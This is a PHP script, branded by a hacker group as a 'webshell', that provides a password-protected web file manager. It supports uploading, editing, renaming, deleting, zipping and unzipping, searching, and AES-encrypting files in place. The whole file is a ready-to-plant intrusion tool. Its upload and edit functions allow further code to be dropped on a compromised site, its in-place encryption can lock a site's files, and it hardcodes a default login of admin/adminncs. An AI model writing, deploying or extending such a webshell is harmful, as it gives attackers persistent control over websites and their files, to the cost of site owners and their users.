<?php
/**
 * NEWBIE CYBER SECURITY - Versi PRO EKSTREM
 * Author: MR.M05T3R (Revised by ChatGPT)
 * Email: offcncs@gmail.com
 * Features: Login, File Manager, Upload, Rename, Delete, Edit, Create, Encrypt/Decrypt, Zip/Unzip, Search, Activity Log
 */

session_start();

// ------------------- CONFIG -------------------
define('USERNAME', 'admin');
define('PASSWORD_HASH', password_hash('adminncs', PASSWORD_DEFAULT)); // Change password here, hashed!
define('ROOT_DIR', realpath(__DIR__)); // Webshell root folder
define('LOG_FILE', ROOT_DIR . '/activity.log');
define('MAX_LOG_SIZE', 1024 * 1024 * 5); // 5 MB max log size

// ------------------- HELPERS -------------------
function logActivity($action, $target = '') {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $date = date('Y-m-d H:i:s');
    $line = "[$date] [$ip] $action $target" . PHP_EOL;
    if (file_exists(LOG_FILE) && filesize(LOG_FILE) > MAX_LOG_SIZE) {
        // Rotate log by renaming old
        rename(LOG_FILE, LOG_FILE . '.old');
    }
    file_put_contents(LOG_FILE, $line, FILE_APPEND | LOCK_EX);
}

function isLoggedIn() {
    return !empty($_SESSION['logged_in']);
}

function checkLogin($user, $pass) {
    if ($user === USERNAME && password_verify($pass, PASSWORD_HASH)) {
        $_SESSION['logged_in'] = true;
        logActivity("Login successful", "User: $user");
        return true;
    }
    logActivity("Login failed", "User: $user");
    return false;
}

function sanitizePath($path) {
    $real = realpath(ROOT_DIR . DIRECTORY_SEPARATOR . ltrim($path, "/\\"));
    if ($real === false) return false;
    if (strpos($real, ROOT_DIR) !== 0) return false;
    return $real;
}

function h($str) {
    return htmlspecialchars($str, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

// ------------------- ACTION HANDLERS -------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['login_user'], $_POST['login_pass'])) {
        // Login attempt
        if (checkLogin($_POST['login_user'], $_POST['login_pass'])) {
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Login gagal! Username atau password salah.";
        }
    }

    if (!isLoggedIn()) {
        http_response_code(403);
        die("Access denied.");
    }

    // Handle file upload
    if (isset($_FILES['upload_file']) && isset($_POST['upload_path'])) {
        $uploadDir = sanitizePath($_POST['upload_path']);
        if ($uploadDir === false || !is_dir($uploadDir)) {
            $error = "Upload path tidak valid.";
        } else {
            $filename = basename($_FILES['upload_file']['name']);
            $targetFile = $uploadDir . DIRECTORY_SEPARATOR . $filename;
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetFile)) {
                logActivity("Uploaded file", $targetFile);
                $success = "File berhasil diupload.";
            } else {
                $error = "Gagal mengupload file.";
            }
        }
    }

    // Handle delete
    if (isset($_POST['delete_path'])) {
        $target = sanitizePath($_POST['delete_path']);
        if ($target === false) {
            $error = "Path tidak valid.";
        } else {
            if (is_dir($target)) {
                // Hapus folder kosong saja
                if (@rmdir($target)) {
                    logActivity("Deleted folder", $target);
                    $success = "Folder berhasil dihapus.";
                } else {
                    $error = "Gagal menghapus folder (pastikan kosong).";
                }
            } else {
                if (@unlink($target)) {
                    logActivity("Deleted file", $target);
                    $success = "File berhasil dihapus.";
                } else {
                    $error = "Gagal menghapus file.";
                }
            }
        }
    }

    // Handle rename
    if (isset($_POST['rename_old'], $_POST['rename_new'])) {
        $oldPath = sanitizePath($_POST['rename_old']);
        $newName = basename($_POST['rename_new']);
        if ($oldPath === false || empty($newName)) {
            $error = "Input rename tidak valid.";
        } else {
            $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
            if (file_exists($newPath)) {
                $error = "Nama baru sudah ada.";
            } else {
                if (rename($oldPath, $newPath)) {
                    logActivity("Renamed", "$oldPath -> $newPath");
                    $success = "Rename berhasil.";
                } else {
                    $error = "Gagal melakukan rename.";
                }
            }
        }
    }

    // Handle create file
    if (isset($_POST['create_file_path'])) {
        $filePath = sanitizePath($_POST['create_file_path']);
        if ($filePath === false) {
            $error = "Path tidak valid.";
        } elseif (file_exists($filePath)) {
            $error = "File sudah ada.";
        } else {
            if (file_put_contents($filePath, '') !== false) {
                logActivity("Created file", $filePath);
                $success = "File baru berhasil dibuat.";
            } else {
                $error = "Gagal membuat file.";
            }
        }
    }

    // Handle create folder
    if (isset($_POST['create_folder_path'])) {
        $folderPath = sanitizePath($_POST['create_folder_path']);
        if ($folderPath === false) {
            $error = "Path tidak valid.";
        } elseif (file_exists($folderPath)) {
            $error = "Folder sudah ada.";
        } else {
            if (mkdir($folderPath, 0755, true)) {
                logActivity("Created folder", $folderPath);
                $success = "Folder baru berhasil dibuat.";
            } else {
                $error = "Gagal membuat folder.";
            }
        }
    }

    // Handle file edit save
    if (isset($_POST['edit_file_path'], $_POST['edit_file_content'])) {
        $editFile = sanitizePath($_POST['edit_file_path']);
        if ($editFile === false || !is_file($editFile)) {
            $error = "File tidak valid.";
        } else {
            if (file_put_contents($editFile, $_POST['edit_file_content']) !== false) {
                logActivity("Edited file", $editFile);
                $success = "File berhasil disimpan.";
            } else {
                $error = "Gagal menyimpan file.";
            }
        }
    }

    // Handle encrypt file
    if (isset($_POST['encrypt_path'], $_POST['encrypt_key'])) {
        $filePath = sanitizePath($_POST['encrypt_path']);
        $key = $_POST['encrypt_key'];
        if ($filePath === false || !is_file($filePath)) {
            $error = "Path file tidak valid.";
        } elseif (strlen($key) < 16) {
            $error = "Kunci enkripsi minimal 16 karakter.";
        } else {
            try {
                $data = file_get_contents($filePath);
                $ivlen = openssl_cipher_iv_length('aes-256-cbc');
                $iv = openssl_random_pseudo_bytes($ivlen);
                $encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
                if ($encrypted === false) throw new Exception('Enkripsi gagal');
                file_put_contents($filePath, $iv . $encrypted);
                logActivity("Encrypted file", $filePath);
                $success = "File berhasil dienkripsi.";
            } catch (Exception $e) {
                $error = "Error: " . $e->getMessage();
            }
        }
    }

    // Handle decrypt file
    if (isset($_POST['decrypt_path'], $_POST['decrypt_key'])) {
        $filePath = sanitizePath($_POST['decrypt_path']);
        $key = $_POST['decrypt_key'];
        if ($filePath === false || !is_file($filePath)) {
            $error = "Path file tidak valid.";
        } elseif (strlen($key) < 16) {
            $error = "Kunci dekripsi minimal 16 karakter.";
        } else {
            try {
                $data = file_get_contents($filePath);
                $ivlen = openssl_cipher_iv_length('aes-256-cbc');
                $iv = substr($data, 0, $ivlen);
                $ciphertext = substr($data, $ivlen);
                $decrypted = openssl_decrypt($ciphertext, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
                if ($decrypted === false) throw new Exception('Dekripsi gagal');
                file_put_contents($filePath, $decrypted);
                logActivity("Decrypted file", $filePath);
                $success = "File berhasil didekripsi.";
            } catch (Exception $e) {
                $error = "Error: " . $e->getMessage();
            }
        }
    }

    // Handle compress to ZIP
    if (isset($_POST['compress_path'], $_POST['zip_name'])) {
        $sourcePath = sanitizePath($_POST['compress_path']);
        $zipName = basename($_POST['zip_name']);
        $zipPath = ROOT_DIR . DIRECTORY_SEPARATOR . $zipName;
        if ($sourcePath === false) {
            $error = "Path sumber tidak valid.";
        } elseif (empty($zipName) || substr($zipName, -4) !== '.zip') {
            $error = "Nama file zip harus diakhiri dengan .zip";
        } else {
            $zip = new ZipArchive();
            if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
                $error = "Gagal membuat file zip.";
            } else {
                $filesAdded = 0;
                if (is_dir($sourcePath)) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($sourcePath, RecursiveDirectoryIterator::SKIP_DOTS)
                    );
                    $baseLen = strlen($sourcePath) + 1;
                    foreach ($files as $file) {
                        if (!$file->isDir()) {
                            $filePath = $file->getRealPath();
                            $relativePath = substr($filePath, $baseLen);
                            $zip->addFile($filePath, $relativePath);
                            $filesAdded++;
                        }
                    }
                } elseif (is_file($sourcePath)) {
                    $zip->addFile($sourcePath, basename($sourcePath));
                    $filesAdded++;
                }
                $zip->close();
                if ($filesAdded > 0) {
                    logActivity("Compressed to ZIP", $zipPath);
                    $success = "Berhasil membuat file zip: " . h($zipName);
                } else {
                    $error = "Tidak ada file yang dikompres.";
                    unlink($zipPath);
                }
            }
        }
    }

    // Handle unzip
    if (isset($_POST['unzip_path'], $_POST['unzip_to'])) {
        $zipPath = sanitizePath($_POST['unzip_path']);
        $extractTo = sanitizePath($_POST['unzip_to']);
        if ($zipPath === false || !is_file($zipPath)) {
            $error = "File zip tidak valid.";
        } elseif ($extractTo === false || !is_dir($extractTo)) {
            $error = "Direktori ekstrak tidak valid.";
        } else {
            $zip = new ZipArchive();
            if ($zip->open($zipPath) === TRUE) {
                $zip->extractTo($extractTo);
                $zip->close();
                logActivity("Unzipped file", $zipPath . " to " . $extractTo);
                $success = "Berhasil mengekstrak file zip.";
            } else {
                $error = "Gagal membuka file zip.";
            }
        }
    }

    // Handle logout
    if (isset($_POST['logout'])) {
        logActivity("User logged out");
        session_destroy();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

// ------------------- UI -------------------
if (!isLoggedIn()) {
    // LOGIN FORM
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8" />
        <title>LOGIN WEBSHELL - NEWBIE CYBER SECURITY</title>
        <style>
            body {background:#121212; color:#eee; font-family: monospace;}
            .login-container {max-width: 320px; margin: 80px auto; padding: 20px; background:#222; border-radius: 6px;}
            input[type=text], input[type=password] {
                width: 100%; padding: 10px; margin: 8px 0; background:#333; border: none; color:#eee; border-radius:4px;
            }
            input[type=submit] {
                width: 100%; background:#007bff; color:#fff; padding: 10px; border:none; border-radius:4px; cursor:pointer;
                font-weight: bold;
            }
            .error {color:#f66;}
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>LOGIN SHELL NEWBIE CYBER SECURITY</h2>
            <?php if (!empty($error)) echo '<p class="error">' . h($error) . '</p>'; ?>
            <form method="POST" autocomplete="off">
                <input type="text" name="login_user" placeholder="Username" required autofocus />
                <input type="password" name="login_pass" placeholder="Password" required />
                <input type="submit" value="Login" />
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// --------------------------------
// MAIN FILE MANAGER INTERFACE BELOW
// --------------------------------

$dir = $_GET['dir'] ?? '.';
$dirPath = sanitizePath($dir);
if ($dirPath === false) {
    $dirPath = ROOT_DIR;
}
$relDir = substr($dirPath, strlen(ROOT_DIR));
if ($relDir === false) $relDir = '.';
if ($relDir === '') $relDir = '.';

$files = scandir($dirPath);
sort($files);

function fileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🌀',
        'txt' => '📄',
        'jpg' => '🖼️',
        'png' => '🖼️',
        'gif' => '🖼️',
        'zip' => '📦',
        'rar' => '📦',
        'exe' => '⚙️',
        'html'=> '🌐',
        'js'  => '📜',
        'css' => '🎨',
        'json'=> '🗂️',
        'md'  => '📄',
        'default' => '📁',
    ];
    return $icons[$ext] ?? '📄';
}

// Helper to get parent dir link
function parentDir($dir) {
    $parent = dirname($dir);
    if ($parent === '.' || $parent === '/') return '';
    return $parent;
}

?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<title>NEWBIE CYBER SECURITY - SHELL</title>
<style>
    body {
        font-family: monospace;
        background: #121212;
        color: #eee;
        margin: 0;
        padding: 0;
    }
    a {
        color: #4ea1d3;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
    }
    header {
        background: #222;
        padding: 10px 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    .container {
        max-width: 1100px;
        margin: 20px auto;
        padding: 10px 20px;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-bottom: 15px;
    }
    th, td {
        border-bottom: 1px solid #444;
        padding: 8px;
        text-align: left;
        vertical-align: middle;
    }
    th {
        background: #222;
    }
    tr:hover {
        background: #333;
    }
    input[type=text], input[type=password], textarea {
        background: #222;
        border: 1px solid #444;
        color: #eee;
        padding: 6px;
        border-radius: 3px;
        width: 100%;
        box-sizing: border-box;
        font-family: monospace;
        font-size: 14px;
    }
    textarea {
        resize: vertical;
        height: 300px;
    }
    button, input[type=submit] {
        background: #4ea1d3;
        border: none;
        color: #fff;
        padding: 7px 15px;
        margin: 3px 0;
        border-radius: 3px;
        cursor: pointer;
        font-weight: bold;
    }
    button:hover, input[type=submit]:hover {
        background: #3778b5;
    }
    .flex {
        display: flex;
        gap: 10px;
        flex-wrap: wrap;
        align-items: center;
    }
    .flex > * {
        flex-grow: 1;
    }
    .message {
        padding: 10px;
        margin-bottom: 15px;
        border-radius: 3px;
    }
    .success {
        background: #26532b;
        color: #a7d08c;
    }
    .error {
        background: #662525;
        color: #f29b9b;
    }
    footer {
        background: #222;
        padding: 10px 20px;
        color: #777;
        text-align: center;
        font-size: 12px;
        margin-top: 40px;
    }
</style>
</head>
<body>
<header>
    <div><strong>NEWBIE CYBER SECURITY</strong> - WEBSHELL</div>
    <form method="POST" style="margin:0;">
        <input type="hidden" name="logout" value="1" />
        <button type="submit" title="Logout">Logout</button>
    </form>
</header>
<div class="container">

<?php
if (!empty($error)) {
    echo '<div class="message error">' . h($error) . '</div>';
}
if (!empty($success)) {
    echo '<div class="message success">' . h($success) . '</div>';
}

// Breadcrumb
$crumbs = explode(DIRECTORY_SEPARATOR, trim($relDir, DIRECTORY_SEPARATOR));
echo '<nav style="margin-bottom:15px;">';
echo '<a href="?dir=.">Root</a>';
$path = '';
foreach ($crumbs as $crumb) {
    if ($crumb === '') continue;
    $path .= $crumb . DIRECTORY_SEPARATOR;
    echo ' &raquo; <a href="?dir=' . urlencode(trim($path, DIRECTORY_SEPARATOR)) . '">' . h($crumb) . '</a>';
}
echo '</nav>';

// File list
echo '<table>';
echo '<tr><th>Nama</th><th>Ukuran</th><th>Tipe</th><th>Aksi</th></tr>';
foreach ($files as $file) {
    if ($file === '.') continue;
    if ($file === '..') {
        $parent = dirname($relDir);
        if ($parent === '') $parent = '.';
        echo '<tr><td colspan="4"><a href="?dir=' . urlencode($parent) . '">.. (Ke Folder Induk)</a></td></tr>';
        continue;
    }

    $filePath = $dirPath . DIRECTORY_SEPARATOR . $file;
    $relFilePath = trim($relDir . DIRECTORY_SEPARATOR . $file, DIRECTORY_SEPARATOR);

    $isDir = is_dir($filePath);
    $size = $isDir ? '-' : filesize($filePath);
    $type = $isDir ? 'Folder' : mime_content_type($filePath);
    $icon = $isDir ? '📁' : fileIcon($file);

    echo '<tr>';
    echo '<td>' . $icon . ' ';
    if ($isDir) {
        echo '<a href="?dir=' . urlencode($relFilePath) . '">' . h($file) . '</a>';
    } else {
        echo h($file);
    }
    echo '</td>';
    echo '<td>' . ($isDir ? '-' : number_format($size)) . '</td>';
    echo '<td>' . h($type) . '</td>';
    echo '<td>';
    // Actions: Edit (file), Delete, Rename, Encrypt, Decrypt
    if (!$isDir) {
        echo '<a href="?dir=' . urlencode($relDir) . '&edit=' . urlencode($relFilePath) . '">Edit</a> | ';
        echo '<a href="?dir=' . urlencode($relDir) . '&encrypt=' . urlencode($relFilePath) . '">Encrypt</a> | ';
        echo '<a href="?dir=' . urlencode($relDir) . '&decrypt=' . urlencode($relFilePath) . '">Decrypt</a> | ';
    }
    echo '<form method="POST" style="display:inline;" onsubmit="return confirm(\'Yakin ingin menghapus ' . h($file) . '?\');">';
    echo '<input type="hidden" name="delete_path" value="' . h($relFilePath) . '" />';
    echo '<button type="submit" style="background:#d9534f;">Hapus</button>';
    echo '</form>';
    echo ' | ';
    echo '<form method="POST" style="display:inline;">';
    echo '<input type="hidden" name="rename_old" value="' . h($relFilePath) . '" />';
    echo '<input type="text" name="rename_new" value="' . h($file) . '" required style="width:120px;"/>';
    echo '<button type="submit">Rename</button>';
    echo '</form>';
    echo '</td>';
    echo '</tr>';
}
echo '</table>';
?>

<!-- UPLOAD FORM -->
<h3>Upload File ke: <?=h($relDir)?></h3>
<form method="POST" enctype="multipart/form-data">
    <input type="hidden" name="upload_path" value="<?=h($relDir)?>" />
    <input type="file" name="upload_file" required />
    <button type="submit">Upload</button>
</form>

<!-- CREATE FILE -->
<h3>Buat File Baru</h3>
<form method="POST">
    <input type="text" name="create_file_path" placeholder="<?=h($relDir . DIRECTORY_SEPARATOR . 'nama_file.txt')?>" required />
    <button type="submit">Buat File</button>
</form>

<!-- CREATE FOLDER -->
<h3>Buat Folder Baru</h3>
<form method="POST">
    <input type="text" name="create_folder_path" placeholder="<?=h($relDir . DIRECTORY_SEPARATOR . 'nama_folder')?>" required />
    <button type="submit">Buat Folder</button>
</form>

<?php
// Edit file interface
if (isset($_GET['edit'])) {
    $editPath = sanitizePath($_GET['edit']);
    if ($editPath && is_file($editPath)) {
        $content = file_get_contents($editPath);
        ?>
        <hr>
        <h3>Edit File: <?=h($_GET['edit'])?></h3>
        <form method="POST">
            <input type="hidden" name="edit_file_path" value="<?=h($_GET['edit'])?>" />
            <textarea name="edit_file_content" spellcheck="false"><?=h($content)?></textarea>
            <button type="submit">Simpan Perubahan</button>
        </form>
        <?php
    } else {
        echo '<div class="error">File tidak ditemukan atau path tidak valid.</div>';
    }
}

// Encrypt file form
if (isset($_GET['encrypt'])) {
    $encPath = sanitizePath($_GET['encrypt']);
    if ($encPath && is_file($encPath)) {
        ?>
        <hr>
        <h3>Encrypt File: <?=h($_GET['encrypt'])?></h3>
        <form method="POST">
            <input type="hidden" name="encrypt_path" value="<?=h($_GET['encrypt'])?>" />
            <input type="password" name="encrypt_key" placeholder="Kunci Enkripsi (min 16 karakter)" required />
            <button type="submit">Encrypt</button>
        </form>
        <?php
    } else {
        echo '<div class="error">File tidak ditemukan atau path tidak valid.</div>';
    }
}

// Decrypt file form
if (isset($_GET['decrypt'])) {
    $decPath = sanitizePath($_GET['decrypt']);
    if ($decPath && is_file($decPath)) {
        ?>
        <hr>
        <h3>Decrypt File: <?=h($_GET['decrypt'])?></h3>
        <form method="POST">
            <input type="hidden" name="decrypt_path" value="<?=h($_GET['decrypt'])?>" />
            <input type="password" name="decrypt_key" placeholder="Kunci Dekripsi (min 16 karakter)" required />
            <button type="submit">Decrypt</button>
        </form>
        <?php
    } else {
        echo '<div class="error">File tidak ditemukan atau path tidak valid.</div>';
    }
}

// Compress to ZIP form
?>
<hr>
<h3>Compress ke ZIP</h3>
<form method="POST">
    <label>Folder/File Sumber (relatif):</label>
    <input type="text" name="compress_path" placeholder="<?=h($relDir)?>" value="<?=h($relDir)?>" required />
    <label>Nama file ZIP (misal: archive.zip):</label>
    <input type="text" name="zip_name" placeholder="archive.zip" required />
    <button type="submit">Compress</button>
</form>

<!-- Unzip form -->
<hr>
<h3>Unzip File</h3>
<form method="POST">
    <label>File ZIP (relatif):</label>
    <input type="text" name="unzip_path" placeholder="<?=h($relDir . '/file.zip')?>" required />
    <label>Ekstrak ke folder (relatif):</label>
    <input type="text" name="unzip_to" placeholder="<?=h($relDir)?>" required />
    <button type="submit">Unzip</button>
</form>

<!-- Search files -->
<hr>
<h3>Pencarian File</h3>
<form method="GET">
    <input type="hidden" name="dir" value="<?=h($relDir)?>" />
    <input type="text" name="search" placeholder="Cari nama file atau folder" required value="<?=h($_GET['search'] ?? '')?>" />
    <button type="submit">Cari</button>
</form>

<?php
// Search results
if (!empty($_GET['search'])) {
    $searchTerm = $_GET['search'];
    echo '<h4>Hasil pencarian untuk: ' . h($searchTerm) . '</h4>';
    $results = [];

    // Recursive search function
    function recursiveSearch($dir, $term) {
        $res = [];
        $items = @scandir($dir);
        if (!$items) return $res;
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            if (stripos($item, $term) !== false) {
                $res[] = $path;
            }
            if (is_dir($path)) {
                $res = array_merge($res, recursiveSearch($path, $term));
            }
        }
        return $res;
    }

    $results = recursiveSearch($dirPath, $searchTerm);
    if (count($results) === 0) {
        echo '<p>Tidak ada file/folder ditemukan.</p>';
    } else {
        echo '<ul>';
        foreach ($results as $r) {
            $rRel = substr($r, strlen(ROOT_DIR));
            if ($rRel === false) $rRel = $r;
            $rRel = ltrim(str_replace(DIRECTORY_SEPARATOR, '/', $rRel), '/');
            $icon = is_dir($r) ? '📁' : fileIcon($r);
            echo '<li>' . $icon . ' <a href="?dir=' . urlencode(dirname($rRel)) . '">' . h($rRel) . '</a></li>';
        }
        echo '</ul>';
    }
}
?>

<footer>
    NEWBIE CYBER SECURITY &mdash; VERSI WEBSHELL EKSTREM &copy; 2025 FOUNDED MR.M05T3R &nbsp;|&nbsp; LOGGED IN AS: <?=h(USERNAME)?>
</footer>
</div>
</body>
</html>
